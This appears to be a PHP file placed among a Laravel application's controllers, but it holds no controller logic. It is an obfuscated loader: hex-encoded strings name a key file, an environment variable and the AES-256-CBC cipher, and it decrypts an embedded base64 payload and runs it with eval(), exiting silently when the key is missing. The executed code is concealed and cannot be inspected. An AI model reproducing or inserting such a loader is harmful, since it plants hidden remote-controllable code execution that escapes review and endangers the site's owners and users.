<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('AC3B4JpPgase820VpTcrHA==');

$c=base64_decode(

'VkIaD87aw3ZmlSGwNpgxMXkFVByVk6p/afh6UEsiN+1xEtDJTx1Zby7VnweF33NIlozp5c3WJTbZ' .
'dKjtpANQIZLGZnWQbKvyfI095PqyxLI/tA4PwYLjpG0qykLuN/TGLmaY7rZJfuAgxPmwZRdB+Xj0' .
'PeWhh3wRPkWUKuTVmPJMOU/jRknqZgCW+XnNISQ0Rtt98mb3LVrMqDLiie1Jbg2xvoSt3d5bFDzf' .
'VRrd2QEvn66b+HnbjvdOcqONcD2EIRapchZiFvGS1S0DMU+sfStaeOxT1d1P3Qj86XK+DrcwZSXw' .
'dkSJSQ+8N/U9D7GJ0dGkqtG6CBNitn7JxlJB2BvF9UL2YaSPPr8VVirtuqXKcHQE5AjT/pQG5WhF' .
'9ObaWwbEduecaLNNXmnNoJf+PQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

